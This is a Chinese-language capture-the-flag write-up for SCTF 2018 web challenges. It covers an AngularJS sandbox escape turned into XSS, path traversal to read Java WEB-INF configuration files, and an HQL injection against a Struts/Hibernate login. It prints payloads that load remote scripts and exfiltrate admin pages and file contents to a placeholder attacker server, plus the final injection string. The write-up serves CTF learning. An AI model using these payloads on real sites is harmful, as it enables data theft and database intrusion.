> 原文链接: https://www.anquanke.com//post/id/149324 


# SCTF 2018 web部分writeup


                                阅读量   
                                **160407**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01f2fe2f5217507f5e.jpg)](https://p3.ssl.qhimg.com/t01f2fe2f5217507f5e.jpg)

NU1L师傅写的wp有点糙，虽然这个比赛web狗饱受打击，我就抓紧时间复现了下，学到了不少东西.



## Web

### <a class="reference-link" name="%E6%96%B0%E7%9A%84%E5%BB%BA%E8%AE%AE%E6%9D%BF"></a>新的建议板

师傅最近开始学前端 想写个建议板 后来失败了？<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9172841-510190b33b4feaff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240) 登录上题，注册了一个账号，直接查看js模板<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9172841-aaa4d80a7fc73f71.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

```
直接在前端的min-test.js
angular.module("mintest",["ngRoute"]).controller("IndexController",function($scope,$route)
`{`$scope.$route=$route`}`).config(function($routeProvider)
`{`$routeProvider.when("/admintest2313",
`{`templateUrl:"view/admintest2313.html",controller:"IndexController"`}`).when("/home",
`{`templateUrl:"view/home.html",controller:"IndexController"`}`).when("/login",
`{`templateUrl:"view/login.html",controller:"IndexController"`}`).when("/loginout",
`{`templateUrl:"view/loginout.html",controller:"IndexController"`}`).when("/register",
`{`templateUrl:"view/register.html",controller:"IndexController"`}`).when("/suggest",
`{`templateUrl:"view/suggest.html",controller:"IndexController"`}`)`}`);
```

直接可以到后台路径，尝试访问view/admintest2313.html，查看源代码[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9172841-50a9e5feeef72771.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240) 可以直接看到后台程序的接口

```
/api/memos/admintest2313
```

直接可以在这里看到使用的AngularJS模板，直接查找相应的模板漏洞

```
`{``{`'a'.constructor.prototype.charAt=[].join;$eval('x=1`}` `}` `}`;alert(1)//');`}`
```

然后直接利用xss反弹到自己的服务器上，看看能获取什么

```
`{``{`'a'.constructor.prototype.charAt=[].join;$eval('x=1`}` `}` `}`;window.open("你的ip")//');`}``}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9172841-9797fb51e9f49063.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

```
`{``{`'a'.constructor.prototype.charAt=[].join;$eval('x=1`}` `}` `}`;eval(atob('$.getScript('http://xxxxxxxxxxxxx/xss1.js');'))//');`}``}`
```

```
xss.js
$.ajax(`{`
    url: "/admin",
    type: "GET",
    dataType: "text",
    success: function(result) `{`
        var code = btoa(encodeURIComponent(result));
        xssPost('http://xxxxxxxxxxxxxxxx', code);
    `}`,
    error: function(msg) `{`

    `}`
`}`)

function xssPost(url, postStr) `{`
    var de;
    de = document.body.appendChild(document.createElement('iframe'));
    de.src = 'about:blank';
    de.height = 1;
    de.width = 1;
    de.contentDocument.write('&lt;form method="POST" action="' + url + '"&gt;&lt;input name="code" value="' + postStr + '"/&gt;&lt;/form&gt;');
    de.contentDocument.forms[0].submit();
    de.style.display = 'none';
`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9172841-70e56c99dbcf50f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240) 把那一堆base64解密

```
&lt;!DOCTYPE html&gt;
&lt;html lang="zh-CN"&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
    &lt;!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ --&gt;
    &lt;meta name="description" content=""&gt;
    &lt;meta name="author" content=""&gt;
    &lt;link rel="icon" href=""&gt;

    &lt;title&gt;SYC&lt;/title&gt;


    &lt;link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet"&gt;
    &lt;link href="css/ie10-viewport-bug-workaround.css" rel="stylesheet"&gt;
    &lt;link href="css/starter-template.css" rel="stylesheet"&gt;
    &lt;style type="text/css"&gt;
          body `{`
            padding-top: 60px;
            padding-bottom: 40px;
          `}`
        &lt;/style&gt;

    &lt;script src="https://cdn.bootcss.com/angular.js/1.4.6/angular.min.js"&gt;&lt;/script&gt;
    &lt;script src="https://apps.bdimg.com/libs/angular-route/1.3.13/angular-route.js"&gt;&lt;/script&gt;
    &lt;script src="js/ie-emulation-modes-warning.js"&gt;&lt;/script&gt;

  &lt;/head&gt;

  &lt;body &gt;

    &lt;nav class="navbar navbar-inverse navbar-fixed-top"&gt;
      &lt;div class="container"&gt;
        &lt;div class="navbar-header"&gt;
          &lt;button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"&gt;
            &lt;span class="sr-only"&gt;Toggle navigation&lt;/span&gt;
            &lt;span class="icon-bar"&gt;&lt;/span&gt;
            &lt;span class="icon-bar"&gt;&lt;/span&gt;
            &lt;span class="icon-bar"&gt;&lt;/span&gt;
          &lt;/button&gt;
          &lt;a class="navbar-brand" href="/"&gt;SYC ADMIN&lt;/a&gt;
        &lt;/div&gt;
        &lt;div id="navbar" class="collapse navbar-collapse"&gt;
          &lt;ul class="nav navbar-nav"&gt;
            &lt;li class="active"&gt;&lt;a href="#"&gt;Home&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href="#"&gt;日志&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href="#"&gt;账单&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href="admin/file"&gt;文件&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href="admin/suggest"&gt;留言&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href="#"&gt;发布&lt;/a&gt;&lt;/li&gt;
          &lt;/ul&gt;
        &lt;/div&gt;
      &lt;/div&gt;
    &lt;/nav&gt;


&lt;div class="container"&gt;
  &lt;div class="jumbotron"&gt;
        &lt;h1&gt;HELLO adminClound&lt;/h1&gt;
        &lt;p&gt;新版后台2.0!&lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;


    &lt;!-- Bootstrap core JavaScript
================================================== --&gt;
&lt;!-- Placed at the end of the document so the pages load faster --&gt;
&lt;script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"&gt;&lt;/script&gt;
&lt;script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"&gt;&lt;/script&gt;
&lt;!-- IE10 viewport hack for Surface/desktop Windows 8 bug --&gt;
&lt;script src="js/ie10-viewport-bug-workaround.js"&gt;&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;
```

这里可以获得用户名adminClound<br>
尝试访问/api/memos/adminClound得到如下信息

```
[`{`"memo":"文件密码：HGf^&amp;39NsslUIf^23"`}`,`{`"memo":"规定完成时间：6月30日"`}`,`{`"memo":"项目完成删除备忘录功能"`}`]
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9172841-5ff9caec35e916ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240) 修改js文件继续访问这两个路径(改url)

```
/admin/file

&lt;div class="container"&gt;
  &lt;form method="post"&gt;
    &lt;label for="filePasswd" class="sr-only"&gt;输入文件密码&lt;/label&gt;
    &lt;input type="text" id="filePasswd" class="form-control" placeholder="filepasswd" required="" autofocus="" name="filepasswd"&gt;
    &lt;button class="btn btn-lg btn-primary btn-block" type="submit"&gt;提交&lt;/button&gt;
  &lt;/form&gt;
&lt;/div&gt;

&lt;!-- Bootstrap core JavaScript
================================================== --&gt;
&lt;!-- Placed at the end of the document so the pages load faster --&gt;
&lt;script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"&gt;&lt;/script&gt;
&lt;script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"&gt;&lt;/script&gt;
&lt;!-- IE10 viewport hack for Surface/desktop Windows 8 bug --&gt;
&lt;script src="js/ie10-viewport-bug-workaround.js"&gt;&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;
```

```
admin/suggest

&lt;div class="container"&gt;
  &lt;h3&gt;留言&lt;/h3&gt;
  &lt;div ng-app&gt;
  &lt;ol&gt;
  &lt;li&gt;&lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;

  &lt;!-- Bootstrap core JavaScript
================================================== --&gt;
&lt;!-- Placed at the end of the document so the pages load faster --&gt;
&lt;script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"&gt;&lt;/script&gt;
&lt;script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"&gt;&lt;/script&gt;
&lt;!-- IE10 viewport hack for Surface/desktop Windows 8 bug --&gt;
&lt;script src="js/ie10-viewport-bug-workaround.js"&gt;&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;
```

接下来东西都有了，直接访问加密的那个文件/admin/file

```
`{``{`'a'.constructor.prototype.charAt=[].join;$eval('x=1`}` `}` `}`;eval(atob("$.post('/admin/file',`{`'filepasswd':'HGf^&amp;39NsslUIf^23'`}`,function(data)`{`(new Image()).src="你的ip/?info="+escape(data);`}`);"));//');`}``}`
```

### <a class="reference-link" name="Zhuanxv"></a>Zhuanxv

你只是在扫描目标端口的时候发现了一个开放的web服务

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9172841-5ea903ef3af549cb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)<br>
扫描一波目录，可以扫到list，然后访问可以抓到怎么一个包<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9172841-62a34b9db348c757.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)猜测可能是文件读取

同时在github上可以找到源码，有用的信息如下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9172841-f2b1392b42051c92.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9172841-220ffce4b64e6a44.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9172841-465d42df9aacd5b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

初始用户名是:homamamama 不过密码改了,拿弱口令字典可以爆出来密码是6yhn7ujm

然后在访问list目录，然后什么都没有发生…….

然后可以看到这个是java写的应用，构造路径直接读取一下web.xml

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9172841-88753feb02c3351c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

直接在github上找框架

```
https://github.com/martin-wong/iCloud
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9172841-18470fb34cfdee9b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://upload-images.jianshu.io/upload_images/9172841-64ff9bcef17ab67f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)<br>
然后直接构造路径读取文件

```
配置文件
HTTP/1.1 200 
Content-Disposition: attachment;filename="bg.jpg"
Content-Type: image/jpeg
Date: Fri, 22 Jun 2018 03:51:44 GMT
Connection: close
Content-Length: 2243

&lt;?xml version="1.0" encoding="UTF-8"?&gt;

&lt;!DOCTYPE struts PUBLIC
        "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"
        "http://struts.apache.org/dtds/struts-2.3.dtd"&gt;
&lt;struts&gt;
    &lt;constant name="strutsenableDynamicMethodInvocation" value="false"/&gt;
    &lt;constant name="struts.mapper.alwaysSelectFullNamespace" value="true" /&gt;
    &lt;constant name="struts.action.extension" value=","/&gt;
    &lt;package name="front" namespace="/" extends="struts-default"&gt;
        &lt;global-exception-mappings&gt;
            &lt;exception-mapping exception="java.lang.Exception" result="error"/&gt;
        &lt;/global-exception-mappings&gt;
        &lt;action name="zhuanxvlogin" class="com.cuitctf.action.UserLoginAction" method="execute"&gt;
            &lt;result name="error"&gt;/ctfpage/login.jsp&lt;/result&gt;
            &lt;result name="success"&gt;/ctfpage/welcome.jsp&lt;/result&gt;
        &lt;/action&gt;
        &lt;action name="loadimage" class="com.cuitctf.action.DownloadAction"&gt;
            &lt;result name="success" type="stream"&gt;
                &lt;param name="contentType"&gt;image/jpeg&lt;/param&gt;
                &lt;param name="contentDisposition"&gt;attachment;filename="bg.jpg"&lt;/param&gt;
                &lt;param name="inputName"&gt;downloadFile&lt;/param&gt;
            &lt;/result&gt;
            &lt;result name="suffix_error"&gt;/ctfpage/welcome.jsp&lt;/result&gt;
        &lt;/action&gt;
    &lt;/package&gt;
    &lt;package name="back" namespace="/" extends="struts-default"&gt;
        &lt;interceptors&gt;
            &lt;interceptor name="oa" class="com.cuitctf.util.UserOAuth"/&gt;
            &lt;interceptor-stack name="userAuth"&gt;
                &lt;interceptor-ref name="defaultStack" /&gt;
                &lt;interceptor-ref name="oa" /&gt;
            &lt;/interceptor-stack&gt;

        &lt;/interceptors&gt;
        &lt;action name="list" class="com.cuitctf.action.AdminAction" method="execute"&gt;
            &lt;interceptor-ref name="userAuth"&gt;
                &lt;param name="excludeMethods"&gt;
                    execute
                &lt;/param&gt;
            &lt;/interceptor-ref&gt;
            &lt;result name="login_error"&gt;/ctfpage/login.jsp&lt;/result&gt;
            &lt;result name="list_error"&gt;/ctfpage/welcome.jsp&lt;/result&gt;
            &lt;result name="success"&gt;/ctfpage/welcome.jsp&lt;/result&gt;
        &lt;/action&gt;
    &lt;/package&gt;
&lt;/struts&gt;
```

然后根据这个逐个的吧文件读取下来<br>
最后可以发现在../../WEB-INF/classes/applicationContext.xml中

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt;
    &lt;bean id="dataSource" class="org.springframework.jdbc.datasource.DriverManagerDataSource"&gt;
        &lt;property name="driverClassName"&gt;
            &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt;
        &lt;/property&gt;
        &lt;property name="url"&gt;
            &lt;value&gt;jdbc:mysql://localhost:3306/sctf&lt;/value&gt;
        &lt;/property&gt;
        &lt;property name="username" value="root"/&gt;
        &lt;property name="password" value="root" /&gt;
    &lt;/bean&gt;
    &lt;bean id="sessionFactory" class="org.springframework.orm.hibernate3.LocalSessionFactoryBean"&gt;
        &lt;property name="dataSource"&gt;
            &lt;ref bean="dataSource"/&gt;
        &lt;/property&gt;
        &lt;property name="mappingLocations"&gt;
            &lt;value&gt;user.hbm.xml&lt;/value&gt;
        &lt;/property&gt;
        &lt;property name="hibernateProperties"&gt;
            &lt;props&gt;
                &lt;prop key="hibernate.dialect"&gt;org.hibernate.dialect.MySQLDialect&lt;/prop&gt;
                &lt;prop key="hibernate.show_sql"&gt;true&lt;/prop&gt;
            &lt;/props&gt;
        &lt;/property&gt;
    &lt;/bean&gt;
    &lt;bean id="hibernateTemplate" class="org.springframework.orm.hibernate3.HibernateTemplate"&gt;
        &lt;property name="sessionFactory"&gt;
            &lt;ref bean="sessionFactory"/&gt;
        &lt;/property&gt;
    &lt;/bean&gt;
    &lt;bean id="transactionManager" class="org.springframework.orm.hibernate3.HibernateTransactionManager"&gt;
        &lt;property name="sessionFactory"&gt;
            &lt;ref bean="sessionFactory"/&gt;
        &lt;/property&gt;
    &lt;/bean&gt;
    &lt;bean id="service" class="org.springframework.transaction.interceptor.TransactionProxyFactoryBean" abstract="true"&gt;
        &lt;property name="transactionManager"&gt;
            &lt;ref bean="transactionManager"/&gt;
        &lt;/property&gt;
        &lt;property name="transactionAttributes"&gt;
            &lt;props&gt;
                &lt;prop key="add"&gt;PROPAGATION_REQUIRED&lt;/prop&gt;
                &lt;prop key="find*"&gt;PROPAGATION_REQUIRED,readOnly&lt;/prop&gt;
            &lt;/props&gt;
        &lt;/property&gt;
    &lt;/bean&gt;
    &lt;bean id="userDAO" class="com.cuitctf.dao.impl.UserDaoImpl"&gt;
        &lt;property name="hibernateTemplate"&gt;
            &lt;ref bean="hibernateTemplate"/&gt;
        &lt;/property&gt;
    &lt;/bean&gt;
    &lt;bean id="userService" class="com.cuitctf.service.impl.UserServiceImpl"&gt;
        &lt;property name="userDao"&gt;
            &lt;ref bean="userDAO"/&gt;
        &lt;/property&gt;
    &lt;/bean&gt;
&lt;/beans&gt;
```

可以看到是用hibernate执行sql<br>
而且flag在数据库中，就需要读取数据库<br>
顺便读取一下../../WEB-INF/classes/user.hbm.xml

```
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE hibernate-mapping PUBLIC
        "-//Hibernate/Hibernate Mapping DTD 3.0//EN"
        "http://hibernate.sourceforge.net/hibernate-mapping-3.0.dtd"&gt;
&lt;hibernate-mapping package="com.cuitctf.po"&gt;
    &lt;class name="User" table="hlj_members"&gt;
        &lt;id name="id" column="user_id"&gt;
            &lt;generator class="identity"/&gt;
        &lt;/id&gt;
        &lt;property name="name"/&gt;
        &lt;property name="password"/&gt;
    &lt;/class&gt;
    &lt;class name="Flag" table="bc3fa8be0db46a3610db3ca0ec794c0b"&gt;
        &lt;id name="flag" column="welcometoourctf"&gt;
            &lt;generator class="identity"/&gt;
        &lt;/id&gt;
        &lt;property name="flag"/&gt;
    &lt;/class&gt;
&lt;/hibernate-mapping&gt;
```

然后在将applicationContext.xml中相应的class反编译，查看过滤条件<br>
这里只贴出关键代码

```
//UserLoginAction.class

    public boolean userCheck(User user) `{`
        List &lt; User &gt; userList = this.userService.loginCheck(user.getName(), user.getPassword());
        if ((userList != null) &amp;&amp; (userList.size() == 1)) `{`
            return true;
        `}`
        addActionError("Username or password is Wrong, please check!");
        return false;
    `}`

    //UserServiceImpl.class

    public List &lt;User&gt; loginCheck(String name, String password) `{`
        name = name.replaceAll(" ", "");
        name = name.replaceAll("=", "");
        Matcher username_matcher = Pattern.compile("^[0-9a-zA-Z]+$").matcher(name);
        Matcher password_matcher = Pattern.compile("^[0-9a-zA-Z]+$").matcher(password);
        if (password_matcher.find()) `{`
            return this.userDao.loginCheck(name, password);
        `}`
        return null;
    `}`

    //UserDaoImpl.class

    public List &lt; User &gt; loginCheck(String name, String password) `{`
        return getHibernateTemplate().find("from User where name ='" + name + "' and password = '" + password + "'");  
    `}`
```

剩下的就是注入了，需要符合Hsql语法规则<br>
最后的payload

```
user.name=1'or(from Flag)like'sctf`{`%25'or''like'&amp;user.password=aaaa
```

### <a class="reference-link" name="easiest%20web%20-%20phpmyadmin"></a>easiest web – phpmyadmin

直接看这个<br>[https://www.jianshu.com/p/f51b6e54d613](https://www.jianshu.com/p/f51b6e54d613)

其他的题我目前的能力还不足以达到，还需努力……



## 参考

[http://www.venenof.com/index.php/archives/551/](http://www.venenof.com/index.php/archives/551/)<br>[http://sec2hack.com/ctf/sctf2018-web-writeup.html](http://sec2hack.com/ctf/sctf2018-web-writeup.html)<br>
在膜一波W&amp;P和NU1L的师傅们



审核人：yiwang   编辑：少爷
